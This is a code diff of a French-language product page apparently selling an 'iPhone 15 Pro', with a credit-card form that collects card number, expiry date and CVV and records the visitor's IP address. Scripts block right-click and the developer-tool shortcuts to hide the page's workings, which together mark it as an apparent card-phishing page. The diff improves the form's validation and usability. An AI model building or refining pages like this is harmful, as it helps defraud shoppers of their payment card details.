@@ -1,5 +1,7 @@
-<html lang="fr" dir="ltr"><head>
-  
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+  <meta charset="UTF-8">
   <title>iPhone 15 Pro</title>
   <!-- Meta viewport pour les smartphones -->
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -54,7 +56,7 @@
     });
   </script>
 
-<script>
+  <script>
     document.addEventListener("contextmenu", function (event) {
         if (!event.target.matches("input, textarea")) {
             event.preventDefault(); // Désactive le clic droit sauf sur les champs de saisie
@@ -71,9 +73,9 @@
             event.preventDefault(); // Bloque F12, Ctrl+Shift+I, Ctrl+Shift+J et Ctrl+U
         }
     });
-</script>
-
-	
+  </script>
+</head>
+<body>
   <section>
     <!-- BLOC PRODUIT -->
     <div class="product_wrapper animate">
@@ -156,19 +158,19 @@
                   <div class="card-number form-group mb-3">
                     <label for="card_number">Numéro de la carte</label>
                     <div class="controls">
-                      <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="Numéro de carte" required="" class="form-control form-control-lg">
+                      <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="Numéro de carte" required="" class="form-control form-control-lg" maxlength="16" pattern="^[0-9]{16}$">
                     </div>
                   </div>
                   <div class="expiry-date form-group mb-3">
                     <label for="expiry_date">Date d'expiration</label>
                     <div class="controls">
-                      <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required="" class="form-control form-control-lg">
+                      <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM/YY" required="" class="form-control form-control-lg" maxlength="5" pattern="^(0[1-9]|1[0-2])\/[0-9]{2}$">
                     </div>
                   </div>
                   <div class="cvv form-group mb-3">
                     <label for="cvv">CVC/CVV</label>
                     <div class="controls">
-                      <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required="" class="form-control form-control-lg">
+                      <input type="tel" name="cvv" id="cvv" autocomplete="cc-csc" placeholder="CVC/CVV" required="" class="form-control form-control-lg" maxlength="3" pattern="^[0-9]{3}$" min="0" max="999">
                     </div>
                   </div>
 
@@ -184,34 +186,36 @@
       </div>
     </div>
   </section>
-    <!-- SECTION INTRODUCTIVE -->
-    <div class="intro_wrapper">
-      <div class="container">
-        <h2>Apple dévoile l'iPhone 15 Pro.</h2>
-        <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
-        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
+  <!-- SECTION INTRODUCTIVE -->
+  <div class="intro_wrapper">
+    <div class="container">
+      <h2>Apple dévoile l'iPhone 15 Pro.</h2>
+      <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
+      <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="iPhone 15 Pro">
+    </div>
+  </div>
+
+  <!-- BLOC D'ACTION -->
+  <div class="action-button_wrapper">
+    <div class="container">
+      <div class="row align-items-center justify-content-center gy-lg-0 gy-4">
+        <!-- Contenu éventuel -->
       </div>
     </div>
-
-    <!-- BLOC D'ACTION -->
-    <div class="action-button_wrapper">
-      <div class="container">
-        <div class="row align-items-center justify-content-center gy-lg-0 gy-4">
-        
+  </div>
 
   <footer>
-		<div class="container">
-			<div class="block-reassurance">
-				<div class="row">
-					<div class="col-12">
-						<h6>Cartes de crédit acceptées:</h6>
-						<img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
-					</div>
-				</div>
-			</div>
-		
-		</div>
-	</footer>
+    <div class="container">
+      <div class="block-reassurance">
+        <div class="row">
+          <div class="col-12">
+            <h6>Cartes de crédit acceptées:</h6>
+            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
 
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
@@ -219,6 +223,15 @@
       // Récupérer l'IP de l'utilisateur
       $.getJSON("https://api.ipify.org?format=json", function (data) {
         $('#user_ip').val(data.ip); // Ajouter l'IP au formulaire
+      });
+
+      // Insertion automatique du "/" dans la date d'expiration
+      $('#expiry_date').on('input', function(){
+        var input = $(this).val();
+        // Si l'utilisateur vient de saisir 2 chiffres et qu'il n'y a pas encore de "/"
+        if(input.length === 2 && !input.includes('/')){
+          $(this).val(input + '/');
+        }
       });
 
       // Soumettre le formulaire avec validation
@@ -268,5 +281,25 @@
     });
   </script>
 
-
-<div id="veepn-guard-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style><div id="veepn-breach-alert"></div><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></body></html>
+  <div id="veepn-guard-alert"></div>
+  <style>
+    @font-face {
+      font-family: FigtreeVF;
+      src: url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),
+           url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");
+      font-weight: 100 1000;
+      font-display: swap;
+    }
+  </style>
+  <div id="veepn-breach-alert"></div>
+  <style>
+    @font-face {
+      font-family: FigtreeVF;
+      src: url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),
+           url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");
+      font-weight: 100 1000;
+      font-display: swap;
+    }
+  </style>
+</body>
+</html>
